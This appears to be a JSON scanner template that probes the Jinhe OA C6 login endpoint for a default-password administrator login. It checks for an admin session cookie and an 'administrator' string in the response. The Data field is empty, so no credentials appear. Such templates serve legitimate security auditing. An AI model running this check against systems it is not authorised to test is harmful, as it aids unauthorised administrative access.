{
    "Name": "金禾OA_c6默认密码",
    "Description": "金禾OA_c6默认密码",
    "Product": "金禾OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/c6/Jhsoft.Web.login/AjaxForLogin.aspx",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
                "Operation": "contains",
                "Key":"Set-Cookie",
                "Value": "SessionIDAdmin="
            },
            {
                "Operation": "contains",
                "Key":"",
                "Value": "\\xcf\\xb5\\xcd\\xb3\\xb9\\xdc\\xc0\\xed\\xd4\\xb1\\x7c"
            },
            {
                "Operation": "code",
                "Key":"",
                "Value": "200"
            }

        ]
        },
        "Next_decide":""
                }
]}
